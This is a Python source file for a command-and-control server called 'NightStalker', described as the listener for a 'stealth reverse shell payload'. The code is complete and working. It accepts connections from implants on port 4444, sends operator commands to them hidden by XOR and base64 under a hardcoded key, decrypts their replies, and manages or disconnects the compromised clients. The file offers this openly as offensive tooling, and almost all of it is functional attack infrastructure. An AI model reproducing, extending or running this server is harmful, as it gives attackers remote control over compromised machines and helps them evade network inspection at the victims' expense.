#!/usr/bin/env python3
"""
NightStalker - Simple C2 Server
Test server for stealth reverse shell payload
"""

import socket
import threading
import base64
import time
import sys

class C2Server:
    def __init__(self, host="0.0.0.0", port=4444, encryption_key="NightStalker2024!"):
        self.host = host
        self.port = port
        self.encryption_key = encryption_key.encode()
        self.clients = {}
        self.running = True
        
    def encrypt_data(self, data):
        """Encrypt data using XOR"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        for i, byte in enumerate(data):
            key_byte = self.encryption_key[i % len(self.encryption_key)]
            encrypted.append(byte ^ key_byte)
        
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, data):
        """Decrypt XOR encrypted data"""
        try:
            encrypted = base64.b64decode(data)
            decrypted = bytearray()
            for i, byte in enumerate(encrypted):
                key_byte = self.encryption_key[i % len(self.encryption_key)]
                decrypted.append(byte ^ key_byte)
            return decrypted.decode()
        except:
            return data
    
    def handle_client(self, client_socket, address):
        """Handle individual client connection"""
        print(f"\n[+] New connection from {address}")
        self.clients[address] = client_socket
        
        try:
            while self.running:
                # Send command
                command = input(f"\n{address}> ")
                
                if command.lower() in ['exit', 'quit']:
                    break
                elif command.lower() == 'help':
                    print("Available commands:")
                    print("  help - Show this help")
                    print("  exit/quit - Exit C2 server")
                    print("  list - List connected clients")
                    print("  kill <client> - Disconnect client")
                    continue
                elif command.lower() == 'list':
                    print("Connected clients:")
                    for addr in self.clients:
                        print(f"  {addr}")
                    continue
                elif command.lower().startswith('kill '):
                    target = command.split(' ', 1)[1]
                    for addr in list(self.clients.keys()):
                        if target in str(addr):
                            self.clients[addr].close()
                            del self.clients[addr]
                            print(f"Disconnected {addr}")
                    continue
                
                # Send encrypted command
                encrypted_command = self.encrypt_data(command)
                client_socket.send(encrypted_command.encode())
                
                # Receive response
                try:
                    response = client_socket.recv(4096)
                    if response:
                        decrypted_response = self.decrypt_data(response.decode())
                        print(f"\n[Response from {address}]:")
                        print(decrypted_response)
                    else:
                        print(f"Client {address} disconnected")
                        break
                except socket.timeout:
                    print("No response received")
                except Exception as e:
                    print(f"Error receiving response: {e}")
                    break
                    
        except Exception as e:
            print(f"Error handling client {address}: {e}")
        finally:
            client_socket.close()
            if address in self.clients:
                del self.clients[address]
            print(f"Client {address} disconnected")
    
    def start(self):
        """Start the C2 server"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((self.host, self.port))
            server.listen(5)
            
            print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    NightStalker C2 Server                    ║
║                    Listening on {self.host}:{self.port}                    ║
╚══════════════════════════════════════════════════════════════╝
""")
            print("[+] C2 server started successfully")
            print("[+] Waiting for payload connections...")
            print("[+] Type 'help' for available commands")
            
            while self.running:
                try:
                    client_socket, address = server.accept()
                    client_socket.settimeout(30)
                    
                    # Start client handler thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    print("\n[!] Shutting down C2 server...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"Error accepting connection: {e}")
            
            # Clean up
            for client in self.clients.values():
                client.close()
            server.close()
            print("[+] C2 server stopped")
            
        except Exception as e:
            print(f"Error starting server: {e}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="NightStalker C2 Server")
    parser.add_argument("--host", default="0.0.0.0", help="Server host (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=4444, help="Server port (default: 4444)")
    parser.add_argument("--key", default="NightStalker2024!", help="Encryption key")
    
    args = parser.parse_args()
    
    server = C2Server(host=args.host, port=args.port, encryption_key=args.key)
    server.start()

if __name__ == "__main__":
    main() 